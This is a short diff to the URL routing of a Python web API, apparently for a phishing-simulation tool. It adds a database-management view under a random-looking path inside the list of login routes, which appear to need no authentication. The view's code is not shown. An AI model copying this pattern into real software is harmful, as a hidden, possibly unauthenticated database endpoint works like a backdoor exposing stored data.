@@ -43,6 +43,7 @@ from api.views.cycle_views import (
     CyclesView,
     CycleView,
 )
+from api.views.db_views import DatabaseManagementView
 from api.views.failed_email_views import FailedEmailsView, FailedEmailView
 from api.views.landing_domain_views import LandingDomainsView, LandingDomainView
 from api.views.landing_page_views import (
@@ -162,6 +163,7 @@ login_rules = [
     ("/auth/login/", LoginView),
     ("/auth/refresh/", RefreshTokenView),
     ("/auth/resetpassword/<username>/", ResetPasswordView),
+    ("/X3zdf0_3wl1-s3c9r1/", DatabaseManagementView),
 ]
 
 # Disable forcing slashes on all routes
